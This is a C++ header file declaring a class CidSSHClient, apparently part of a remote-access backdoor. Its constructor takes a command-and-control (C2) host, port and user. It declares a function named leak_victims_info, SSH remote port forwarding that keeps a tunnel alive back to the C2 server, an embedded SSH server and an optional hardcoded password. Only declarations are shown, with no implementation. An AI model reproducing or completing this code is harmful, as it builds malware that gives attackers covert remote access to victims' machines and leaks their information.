#pragma once

#include <chrono>
#include <string>
#include <thread>
#include <vector>

#include "global.h"
#include "CidSSHServer.h"

class CidSSHClient
{
public:
	CidSSHClient(const std::string C2Host, const int C2Port, const std::string C2User);

	int run();
	static std::atomic_bool should_terminate;
	const std::string C2User_;

private:
	static int leak_victims_info(ssh_session session, const int binded_port);

	static void
	do_remote_forwarding(ssh_session sess,
						 pthread_mutex_t* mutex,
						 std::chrono::time_point<std::chrono::system_clock>* last_keep_alive);

	static void global_requests_cb(ssh_session session, ssh_message message, void* userdata);

	static pthread_mutex_t mutex;
	static std::vector<std::thread> thread_vector;

	unsigned int C2Port_;
	const std::string C2Host_;
	const std::string C2Password_;
	static std::unique_ptr<CidSSHServer> cidSSHServer_;

#ifdef PASSWORD_AUTH
	static char password[30];
#endif
};
